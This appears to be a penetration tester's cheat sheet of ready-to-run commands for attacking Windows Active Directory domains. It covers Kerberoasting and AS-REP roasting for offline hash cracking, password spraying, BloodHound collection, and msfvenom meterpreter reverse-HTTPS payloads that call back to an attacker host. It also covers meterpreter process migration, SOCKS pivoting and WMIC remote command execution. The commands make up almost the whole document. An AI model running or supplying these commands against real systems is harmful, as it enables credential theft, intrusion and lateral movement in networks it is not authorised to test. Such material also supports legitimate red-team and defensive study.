### Kerberoast
GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <TGSs_file>

# ASRepRoast
GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <AS_REP_file>

### Password Policy (current user)
net accounts /domain

### Password Spraying with CME
cme smb <ip> -U <users_file> -p <password> -d <domain> --continue-on-success

# Password spraying with Kerberos (not logged by default on Windows Server)
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>

### nmap TCP all ports
nmap -sS -n -Pn --open -p- -iL <file_with_ips> -oN <output_file>

# nmap UDP top 1000
nmap -sU -n -Pn --open --top-ports 1000 -iL <file_with_ips> -oN <outputfile>

### Bloodhound
neo4j console &
bloodhound

# Bloodhound Ingestors (ps1) : https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
Import-Module .\SharpHound.ps1
Invoke-BloodHound -collectiondmethods all

# Bloodhound Custom queries
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/

# XFreeRDP
xfreerdp /v:<ip> /u:<user> /d:<domain> 

#### MSFVenom : Windows x64 Stageless
msfvenom -p windows/x64/meterpreter_reverse_https lport=443 lhost=<host> -f <format> -o <output_file> -e <encoder> -i <iterations>

# MSFVenom : Windows x64 Staged
msfvenom -p windows/x64/meterpreter/reverse_https lport=443 lhost=<host> -f <format> -o <output_file> -e <encoder> -i <iterations>

### Meterpreter : exec command
execute -i -f <command_on_remote_host> -a <arguments>
execute -i nslookup -a hostname

# Meterpreter : migrate to process NAME
migrate -N <process_name>

# Meterpreter : list x64 process only
ps -A x64

#### Remove empty lines from file
sed '/^[[:space:]]*$/d' File_with_empty_lines.txt > File2.txt 

#### Pivoting with MSF after meterpreter session is opened
1)
use auxiliary/server/socks5
run -j
2)
route add <subnet_from_internal_subnet_of_session> <session_#>
ex: route add 10.0.0.0/8 1
3)
# /etc/proxychains.conf
socks5 127.0.0.1 1080
4)
proxychains <command>

### GPO audit with Grouper2 : https://github.com/l0ss/Grouper2
groupe2.exe -g -i 8 -f grouper2_output.html

# GPO Audit with PingCastle
todo

### WMIC RCE
wmic process call create "cmd.exe /c calc.exe"

# WMIC List users from Group
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value

# WMIC Domain/DC Infos
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
